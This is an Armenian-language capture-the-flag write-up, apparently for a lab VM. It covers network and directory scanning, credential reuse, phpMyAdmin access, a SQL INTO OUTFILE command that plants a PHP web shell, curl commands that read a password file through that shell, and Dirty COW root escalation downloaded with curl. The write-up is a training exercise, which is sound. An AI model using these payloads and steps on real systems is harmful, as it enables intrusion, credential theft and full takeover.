# writeup1
VM run անելուց հետո լոգին լինելա մեզանից ուզում, բայց մենք չունենք լոգին փասս
դրա համար մեր համակարգչի մեջ օգտագործում ենք **netdiscover**
գործիքը․ ինչա անում սա․
**netdiscover** գործիքը վերադարձնումա մեզ մեր ցանցում էս պահի գործող բոլոր ip ները, բացի մեր մեքենայինից․
գրում ենք հետևյալ հրամանը․
```
netdiscover -r 192.168.1.0/24 #-r ֆլագը ip ների range նա, ու որտեղից իմացանք /24 -ի մասին, երբ որ անենք ip a կտեսնենք մեր ip ն, որը /24 ովա ավարտվում
```
ու արդյունքում տեսնում ենք հետևյալը․
```
Currently scanning: Finished!   |   Screen View: Unique Hosts

 11 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 498
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.1.1     e8:01:8d:27:a7:00      5     210  Fiberhome Telecommunication
 192.168.1.3     c8:3a:35:36:91:18      1      60  Tenda Technology Co., Ltd.
 192.168.1.2     d8:af:81:0f:42:36      1      60  AO
 192.168.1.12    08:00:27:45:1c:86      2      84  PCS Systemtechnik GmbH
 192.168.1.6     32:4c:46:b9:8e:42      2      84  Unknown vendor
```

1-ինը իմ ռոուտերն ա
2-րդը իմ մյուս ռոուտերնա
3-րդը թիվիսա
4-րդը չգիտեմ դեռ, մտնենք բրաուզերով տեսնենք․
<img src="img/Pasted image 20240704110727.png">
ըհն, կարծենք գտանք մեր մեքենայի ip-ն․ բայց շատ դատարկա առաջին հայացքից․ արժի directory ները փարս անել, տեսնենք ինչ կա չկա։

դրա համար կարանք օգտագործենք **dirb** թուլը
```
┌──(neo㉿matrix)-[~]
└─$ dirb http://192.168.1.12/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Jul  4 11:13:15 2024
URL_BASE: http://192.168.1.12/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.1.12/ ----
+ http://192.168.1.12/cgi-bin/ (CODE:403|SIZE:288)
==> DIRECTORY: http://192.168.1.12/fonts/
+ http://192.168.1.12/forum (CODE:403|SIZE:285)
+ http://192.168.1.12/index.html (CODE:200|SIZE:1025)
+ http://192.168.1.12/server-status (CODE:403|SIZE:293)

---- Entering directory: http://192.168.1.12/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Thu Jul  4 11:13:19 2024
DOWNLOADED: 4612 - FOUND: 4
```

տեսնում ենք, որ կա մի հատ /forum որի ստատուս կոդը 403 ա (forbidden)
քանի որ մենք միայն http ով էինք սկան արել, եկեք մի հատ https ով փորձենք
աշխարհի output ը տվեց, մինչ սա լինումա, կարանք արդեն https ով ֆորումը մտնենք։
<img src="img/Pasted image 20240704112010.png">
մինչ էս ամենը կուսումնասիրենք, կարանք **nmap** դնենք աշխատի էս մեր ip ի համար․
**nmap**-ը գործիքա, որը սկանա անում մեր տված ip ի բաց պորտերը, ու իրանց մասին ինֆոյա տալիս․ էս վափշե սկզբում պետքա անեինք, ուղղակի ես տարիքով մարդ եմ, մոռացել էի․
```
sudo nmap 192.168.1.12 -sS -sV -sC -v &>out
```

մինչ սկանա լինում,  **Probleme login ?** էջում հետաքրքիր լոգեր ենք տեսնում, որ lmezard user ը ուզումա լոգին լինի, չի ստացվում․ ու որ բրաուզերի ֆունկցիաներից օգտվելով search անենք էդ username ը, կտեսնենք սա.

<img src="img/Pasted image 20240704112903.png">
տեսնում ենք էս լոգերից, որ էդ user ը միամիտ իրա password նա գրել, որպես username ու ֆեյլ ա տվել․

կայքում լոգին լինելու տեղ կա, էկեք դրանով փորձենք
<img src="img/Pasted image 20240704113729.png">
ու թույն, լոգին էղանք
**dirb**-ի output ում նաև կար webmail-ը
<img src="img/Pasted image 20240704114314.png">
lmezard ով լոգին չեղավ, բայց եթե մեր ֆորումից նայենք մեր user ի մեյլը, կտեսնենք սա
<img src="img/Pasted image 20240704120557.png">

էս մեյլով լոգին լինելը ստացվեց, ու մի հետաքրքիր նամակ ենք տեսնում ստեղ
<img src="img/Pasted image 20240704120634.png">
ու երբ որ մտնենք phpmyadmin
<img src="img/Pasted image 20240704120741.png">
էս մեյլի տված փասսվորդով կկարենանք լոգին լինենք

ու էստեղ ունենք sql կոդ գրելու հնարավորություն, ու 40 տարի տանջվելուց և Slack ով ուռիշ մարդկանցից ճշտելլուց հետո հասկացա, որ մենք permission ունենք մենք templates_c folder-ում
դրա համար run կանենք հետևյալը
```
SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/gago.php'
```
<img src="img/Pasted image 20240704122427.png">
ըհն, ստացանք սա․

հիմա եկեք տեսնենք ինչեր կան ստեղ

```
┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=ls%20%20/home'
1	LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz

┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=ls%20-a%20/home'
1	.
..
LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz

┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=ls%20-a%20/home/LOOKATME'
1	.
..
password

┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=ls%20-a%20/home/LOOKATME/password'
1	/home/LOOKATME/password

┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.18/forum/templates_c/gago.php?cmd=cat%20/home/LOOKATME/password'
1	lmezard:G!@M6f4Eatau{sF"

```

էս լոգին փասսով ցավոք ssh ով լոգին չենք կարում լինենք, բայց vm ով կարում ենք

<img src="img/Pasted image 20240712001204.png">
անենք uname -a տեսնենք ինչ կեռնելա, որովհետև տատուցս տարիքով մի քիչա փոքր էս iso ի ֆայլը
<img src="img/Pasted image 20240712001336.png">
ու մի փոքր գուգլելուց հետո **linux 3.2 cve** հանդիպեցի էս լինքին
https://www.cybersecurity-help.cz/exploits/1039/?ref=bulletin
ու գտա github ից էս exploit ը
https://github.com/firefart/dirtycow
git չունենք clone անելու համար, բայց ունենք curl ու 2 քթի ծակ։

գնում ենք tmp, ու curl ով քաշում ենք ֆայլը

```
cd /tmp
curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c > dirty.c
```
exploit-ը օգտագործելու ձևը գրած ա ֆայլում

// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at

compile անենք, ու run անենք

<img src="img/Pasted image 20240712004026.png">
կարծենք ստացվեց․ էկեք փորձենք լոգին լինենք․ էս սկրիպտը username ը փոխումա, էդիթ կանեմ, իմ ֆայլերի մեջ root ով կգցեմ, որ հետո չասեք բա խի root չի, չնայելով, որ id-ն 0-նա։
<img src="img/Pasted image 20240712004305.png">
կարաք շնորհավորեք, ունենք root.

<img src="img/Pasted image 20240712011419.png">
(էս էլ փոխած կոդը, որը գտնվում ա /scripts folder-ի մեջ)
